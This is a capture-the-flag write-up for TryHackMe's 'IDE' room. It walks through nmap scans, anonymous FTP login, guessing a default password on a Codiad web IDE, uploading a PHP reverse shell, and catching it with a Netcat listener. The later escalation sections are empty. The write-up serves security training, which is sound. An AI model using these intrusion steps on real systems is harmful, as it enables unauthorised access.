# IDE

![IDE Room Logo](./Assets/ide.png "IDE Room Logo")

---

## Summary

[IDE](https://tryhackme.com/room/ide "IDE Room On TryHackMe") is a beginner friendly, "easy box to polish your enumeration skills" hosted by [TryHackMe](https://tryhackme.com/ "TryHackMe Official Website") and created by [BlueStorm](https://tryhackme.com/p/bluestorm "BlueStorm TryHackMe Profile") and [403 Exploit](https://tryhackme.com/p/403Exploit "403 Exploit TryHackMe Profile").

This CTF requires basic knowledge of:

* Linux commands such as ```ping```, ```which```, ```ls```, ```cd```, ```cat```, ```sudo```, ```find```, ```systemctl``` and ```restart```.

* Port scanning with tools like ```NMAP```.

* Retrieving files from an ```FTP``` server.

* Uploading a reverse shell to a server.

* Using ```Netcat``` to listen for an incoming connection.

* (**OPTIONAL**) Upgrading a dumb terminal using ```Python```.

* Connecting to a remote server via ```SSH```.

* Editing files with tools like ```Nano```.

* Stopping and restarting services in Linux.

---

## Contents

* [Getting Started](#getting-started "Jump To Getting Started")

* [Port Scanning](#port-scanning "Jump To Port Scanning")

* [Getting Username From FTP Server](#ftp-server "Jump To FTP Server")

* [Finding Password For Website](#website-password "Jump To Website Password")

* [Uploading And Calling Reverse Shell](#reverse-shell "Jump To Reverse Shell")

* [Upgrading The Terminal](#terminal-upgrade "Jump To Terminal Upgrade")

* [Horizontal Privilege Escalation - First Flag](#horizontal-escalation "Jump To Horizontal Escalation")

* [Vertical Privilege Escalation - Root Flag](#vertical-escalation "Jump To Vertical Escalation")

---

## Getting Started

As always we start off by checking that the target machine is up and running by pinging the target IP Address.

```
$ ping <IP_Address>

PING <IP_Address> (<IP_Address>) 56(84) bytes of data.
64 bytes from <IP_Address>: icmp_seq=1 ttl=61 time=224 ms
64 bytes from <IP_Address>: icmp_seq=2 ttl=61 time=180 ms
64 bytes from <IP_Address>: icmp_seq=3 ttl=61 time=222 ms
64 bytes from <IP_Address>: icmp_seq=4 ttl=61 time=183 ms

--- <IP_Address> ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 180.258/202.493/224.379/20.761 ms
```

[Back To Top](#ide "Jump To Top")

---

## Port Scanning

Once we've verified the machine is active we can move on to a port scan using ```nmap``` with the ```-p-``` flag to make sure we scan **ALL** ports.

```
$ nmap -p- <IP_Address>

Nmap scan report for <IP_Address>
Host is up (0.16s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
62337/tcp open  unknown
```

After our initial port scan we can see that there are 4 open ports.

* ```PORT 21``` - FTP (File Transfer Protocol)
* ```PORT 22``` - SSH (Secure Shell)
* ```PORT 80``` - HTTP (HyperText Transfer Protocol)
* ```PORT 62337``` - UNKNOWN

To get more information on these services we can run another port scan but this time we'll use the ```-A``` and ```-p``` flag in order to aggressively scan only these specific ports.

```
$ nmap -A -p 21,22,80,62337 <IP_Address>

Nmap scan report for <IP_Address>
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Codiad 2.8.4
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see from the above port scan that the unknown service on ```PORT 62337``` that we found earlier is another website and the ```FTP``` service allows anonymous login. So our next logical step is to check the ```FTP``` server.

[Back To Top](#ide "Jump To Top")

---

## FTP Server

To login to the ```FTP``` server, we'll use the ```ftp``` command followed by the target IP Address. When prompted for a username we'll use ```anonymous``` and for password we can type anything.

```
$ ftp <IP_Address>

Connected to <IP_Address>.
220 (vsFTPd 3.0.3)
Name: anonymous
331 Please specify the password.
Password: anon
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Now that we've connected to the ```FTP``` server we can list all files in the current directory with the ```ls -la``` command.

```
ftp> ls -la
229 Entering Extended Passive Mode (|||21303|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
```

Once we list the contents of the current directory we'll see a very sneaky directory named ```...```, in the Linux file system this means nothing. The ```.``` directory represents our current directory, while the ```..``` represents our previous directory. And all files or directories prefaced with a ```.``` are hidden by default. So the ```...``` directory is hidden from us when we use the ```-ls``` command. Which is why we should always use ```ls -la``` to list **ALL** files. Even then the unconventional directory name might cause us to miss it or mistake it for the current or previous directories.

Let's change into the ```...``` directory and see what's in there.

```
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||23248|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.
```

Here we find another sneaky file with an unconventional naming scheme, let's download this file named ```-``` with the ```get``` command followed by the file name.

```
ftp> get -
local: - remote: -
229 Entering Extended Passive Mode (|||5886|)
150 Opening BINARY mode data connection for - (151 bytes).
100% |***********************************|   151      193.77 KiB/s    00:00 ETA
226 Transfer complete.
151 bytes received in 00:00 (0.61 KiB/s)
```

Once we've downloaded the file we'll find it on our local machine. If we read the file we'll see it's a reminder to someone named "john" to change his password.

```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

Now we have a username (john) and a potential vulnerabilty (weak/default password).

[Back To Top](#ide "Jump To Top")

---

## Website Password

After getting the username from the file we found in the FTP server we need somewhere to use it. Visiting the website at ```PORT 80``` leads nowhere, but the website at ```PORT 62337``` does have a login form.

Before bruteforcing the login with Hydra or BurpSuite we can try guessing some passwords since we know ```john``` has a default password.

Not shocking, the password is ```password``` and logging in takes us to an online IDE (Integrated Development Environment) with a bunch of Python programs saved in it.

```john:password```

[Back To Top](#ide "Jump To Top")

---

## Reverse Shell

Once we've logged in to the IDE we'll see a bunch of Python files and if we look down towards the bottom of the screen we'll see that these files are stored at ```
/var/www/html/codiad_projects/```.

![File Locations](./Assets/file-locations.png "File Locations")

If we look for the ```/codiad_projects/``` directory on the website at ```PORT 62337``` we won't find it. But if we check the other website at ```PORT 80``` we'll find all those python files in an unprotected directory.

![Unprotected Directory](./Assets/unprotected-directory.png "Unprotected Directory")

Since the directory at ```http://<IP_Address:80/codiad_projects/``` is unprotected AND we have the ability to write and save files in the IDE we can upload a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php "PenTest Monkey Reverse Shell On GitHub") and retrieve it through this directory.

First we'll start a ```Netcat``` listener on port ```1234``` with the following command.

```nc -lnvp 1234```

Next we'll create a new file in the online IDE, the contents of which will be our [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php "PenTest Monkey Reverse Shell On GitHub").

Our reverse shell can now be found in the unprotected directory we found earlier, all we need to do is click on it.

![Reverse Shell File](./Assets/reverse-shell.png "Reverse Shell File")

If successful we should see output in our ```Netcat``` listener similar to the following...

```
Listening on 0.0.0.0 1234

Connection received on <IP_Address> 37904
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

[Back To Top](#ide "Jump To Top")

---

## Terminal Upgrade



[Back To Top](#ide "Jump To Top")

---

## Horizontal Escalation



[Back To Top](#ide "Jump To Top")

---

## Vertical Escalation



[Back To Top](#ide "Jump To Top")
